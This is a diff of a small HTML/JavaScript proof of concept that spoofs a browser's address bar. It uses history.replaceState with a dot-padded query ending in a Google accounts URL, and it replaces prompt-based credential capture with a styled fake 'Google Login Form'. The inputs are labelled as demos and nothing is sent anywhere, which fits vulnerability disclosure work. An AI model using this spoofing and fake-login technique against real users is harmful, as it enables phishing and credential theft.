@@ -1,14 +1,44 @@
 <button id="button">Click PoC</button>
 
+<style>
+#fakeLogin {
+    display: none;
+    width: 300px;
+    padding: 20px;
+    margin-top: 20px;
+    border-radius: 10px;
+    border: 1px solid #ccc;
+    font-family: Arial, sans-serif;
+}
+#fakeLogin input {
+    width: 100%;
+    padding: 8px;
+    margin: 6px 0;
+}
+#fakeLogin button {
+    width: 100%;
+    padding: 10px;
+    cursor: pointer;
+}
+</style>
+
+<div id="fakeLogin">
+    <h3>Google Login Form</h3>
+    <input type="text" placeholder="Demo username (free text)">
+    <input type="password" placeholder="Demo password (free text)">
+    <button>Submit</button>
+</div>
+
 <script>
 button.onclick = () => {
-    // Fake Url
-    history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
+    // Inject deceptive URL
+    history.replaceState(
+        null,
+        '',
+        '?...............................https://accounts.google.com/'
+    );
 
-	// Credential
-	let username = prompt('Enter your username');
-	let password = prompt('Enter your password');
-	alert('Your creds:\nUsername: ' + username + '\nPassword: ' + password);
-
+    // Show fake login form
+    document.getElementById('fakeLogin').style.display = 'block';
 };
 </script>
